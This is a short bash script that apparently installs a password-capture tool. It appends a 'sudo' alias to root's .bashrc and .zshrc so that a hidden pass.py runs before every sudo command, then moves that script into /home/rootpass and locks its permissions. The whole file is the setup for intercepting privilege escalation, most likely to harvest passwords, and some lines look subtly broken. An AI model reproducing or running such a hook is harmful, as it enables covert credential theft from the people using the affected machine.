#!/bin/bash
apt install ruby python3 -y
cd /home
mkdir rootpass
sudo echo "alias sudo=\'python3 /home/rootpass/pass.py && sudo\'" >> /root/.bashrc
sudo echo "alias sudo=\'python3 /home/rootpass/pass.py && sudo\'" >> /root/.zshrc
mv ~/termuxloginpass/pass.py /home/rootpass
sudo chown root /home/rootpass/pass.py
sudo chmod 700 /home/rootpass/pass.py
